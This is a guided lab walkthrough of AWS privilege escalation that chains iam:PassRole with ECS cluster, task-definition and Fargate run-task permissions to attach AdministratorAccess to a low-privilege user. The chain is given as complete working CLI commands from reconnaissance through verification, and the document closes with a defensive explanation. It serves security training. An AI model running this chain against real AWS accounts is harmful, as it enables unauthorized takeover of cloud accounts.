# Guided Walkthrough: Privilege Escalation via iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition + ecs:RunTask

This scenario demonstrates a privilege escalation vulnerability rooted in a dangerous combination of ECS permissions and `iam:PassRole`. When an IAM principal can create an ECS cluster, register a task definition referencing a privileged role, and then run that task on Fargate, they can cause AWS infrastructure to execute arbitrary container code under that privileged role's identity. This is not a bug in ECS — it is the intended behavior, and it is why this permission combination is treated as a privilege escalation path.

The subtlety here is that `iam:PassRole` is often granted without a full appreciation of what it enables downstream. Granting PassRole on a role with administrative permissions, even alongside ostensibly narrow ECS permissions, effectively hands the grantee a path to full account compromise. The attacker never directly assumes the admin role — they instruct a Fargate task to assume it on their behalf, and the container executes whatever IAM commands they embed in the task definition.

This pattern appears in real environments when developers or CI/CD systems are granted ECS deployment permissions alongside PassRole on a shared task execution role that has broader permissions than intended. The "shared role" grows in permissions over time, and eventually someone notices it is passable to Fargate by a low-privilege principal.

## The Challenge

You have obtained credentials for `pl-prod-ecs-002-to-admin-starting-user` — a low-privilege IAM user in the account. This user cannot list IAM users, create roles, or do anything directly administrative. But it does have four permissions that together form a complete escalation path: `ecs:CreateCluster`, `iam:PassRole` on the target role, `ecs:RegisterTaskDefinition`, and `ecs:RunTask`.

Your goal is to achieve effective administrator access, specifically by getting `AdministratorAccess` attached to your starting user. The path runs through Fargate.

Start by confirming your starting position:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

You should see yourself as `pl-prod-ecs-002-to-admin-starting-user`. Confirm you have no admin access yet:

```bash
aws iam list-users --max-items 1
# AccessDenied
```

Good. Now let's figure out what you can do.

## Reconnaissance

The starting user has several helpful permissions for reconnaissance. First, find the network configuration you'll need to run a Fargate task. Fargate requires awsvpc networking — you need a subnet ID:

```bash
# Find the default VPC
aws ec2 describe-vpcs \
  --filters "Name=is-default,Values=true" \
  --query 'Vpcs[0].VpcId' \
  --output text
```

Note the VPC ID, then find a subnet within it:

```bash
aws ec2 describe-subnets \
  --filters "Name=vpc-id,Values=<vpc-id>" \
  --query 'Subnets[0].SubnetId' \
  --output text
```

Save this subnet ID — you will need it when running the task. Also grab the account ID, since you'll be constructing role ARNs:

```bash
aws sts get-caller-identity --query 'Account' --output text
```

Now look at your own attached policies. You should see a policy that grants `iam:PassRole` scoped to a specific role ARN — `arn:aws:iam::{account_id}:role/pl-prod-ecs-002-to-admin-target-role`. That scoping tells you exactly which role you can pass to ECS. The role name gives away that it is the target role for this escalation.

## Exploitation

With your reconnaissance complete, execute the four-step attack chain.

**Step 1: Create an ECS cluster.**

You need somewhere to run your task. Create an attacker-controlled cluster:

```bash
aws ecs create-cluster \
  --cluster-name pl-prod-ecs-002-attack-cluster
```

Note the cluster ARN from the output. The cluster exists now, but it is empty — no tasks, no capacity. For Fargate, that is fine; capacity is managed by AWS.

**Step 2: Register a malicious task definition.**

This is the heart of the attack. You will define a task definition that:
- Uses `awsvpc` network mode (required for Fargate)
- Specifies `pl-prod-ecs-002-to-admin-target-role` as both the task role and the execution role
- Runs a container using the `amazon/aws-cli` image with a command that attaches `AdministratorAccess` to your starting user

The `iam:PassRole` permission you hold is what authorizes AWS to accept a role in the `taskRoleArn` field. Without it, this API call would be denied.

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-ecs-002-to-admin-target-role"
REGION="us-east-1"  # use the region your scenario is deployed to

aws ecs register-task-definition \
  --family pl-ecs-002-admin-escalation \
  --network-mode awsvpc \
  --requires-compatibilities FARGATE \
  --cpu 256 \
  --memory 512 \
  --task-role-arn "$ADMIN_ROLE_ARN" \
  --execution-role-arn "$ADMIN_ROLE_ARN" \
  --container-definitions '[
    {
      "name": "escalation-container",
      "image": "amazon/aws-cli:latest",
      "essential": true,
      "command": [
        "iam", "attach-user-policy",
        "--user-name", "pl-prod-ecs-002-to-admin-starting-user",
        "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
      ],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-create-group": "true",
          "awslogs-group": "/ecs/pl-ecs-002-admin-escalation",
          "awslogs-region": "us-east-1",
          "awslogs-stream-prefix": "ecs"
        }
      }
    }
  ]'
```

If the call succeeds, you'll see the task definition ARN in the output. Crucially, AWS accepted the `taskRoleArn` field — it validated your `iam:PassRole` permission and registered the definition.

**Step 3: Run the task on Fargate.**

Now execute the task. Use the cluster you created and the subnet you identified during reconnaissance:

```bash
SUBNET_ID="<subnet-id-from-recon>"

aws ecs run-task \
  --cluster pl-prod-ecs-002-attack-cluster \
  --task-definition pl-ecs-002-admin-escalation \
  --launch-type FARGATE \
  --network-configuration "awsvpcConfiguration={subnets=[$SUBNET_ID],assignPublicIp=ENABLED}"
```

Note the task ARN from the output. The task is now starting. AWS is pulling the `amazon/aws-cli` container image and preparing to run it with `pl-prod-ecs-002-to-admin-target-role` credentials injected into the container environment.

**Step 4: Wait for the task to complete.**

Poll the task status until it reaches `STOPPED`:

```bash
TASK_ARN="<task-arn-from-above>"

aws ecs describe-tasks \
  --cluster pl-prod-ecs-002-attack-cluster \
  --tasks "$TASK_ARN" \
  --query 'tasks[0].lastStatus' \
  --output text
```

This typically takes 60-90 seconds. The task goes through `PROVISIONING -> PENDING -> RUNNING -> STOPPED`. Once it reaches `STOPPED`, check the exit code:

```bash
aws ecs describe-tasks \
  --cluster pl-prod-ecs-002-attack-cluster \
  --tasks "$TASK_ARN" \
  --query 'tasks[0].containers[0].exitCode' \
  --output text
```

Exit code `0` means the `iam attach-user-policy` command ran successfully inside the container, using the administrative role's credentials.

## Verification

Wait 15 seconds for IAM changes to propagate, then check what policies are now attached to your starting user:

```bash
sleep 15

aws iam list-attached-user-policies \
  --user-name pl-prod-ecs-002-to-admin-starting-user
```

You should see `AdministratorAccess` in the policy list. Now confirm with a privileged API call:

```bash
aws iam list-users --max-items 3 --output table
```

It works. Your starting user — the same credentials you have been using throughout — now has full administrative access to the AWS account.

## What Happened

You exploited a four-permission combination: `ecs:CreateCluster`, `iam:PassRole`, `ecs:RegisterTaskDefinition`, and `ecs:RunTask`. Individually each permission seems limited. Together they let you provision container infrastructure, attach a privileged role to it, and execute arbitrary code under that role's identity. The privileged role then used its IAM permissions to escalate your starting user to administrator — all without you ever directly assuming the admin role yourself.

This is a "new passrole" escalation: you created the infrastructure, you passed the role, you ran the task. The key insight is that `iam:PassRole` scoped to an admin role is essentially the same as having the admin role's permissions — any service that accepts PassRole and can run arbitrary code becomes the exploit vehicle. In real environments, this pattern emerges when ECS deployment permissions are granted to CI/CD systems or developers alongside a shared task role that has grown in scope. The defense requires treating any `iam:PassRole` grant targeting a privileged role as equivalent to granting those privileges directly.
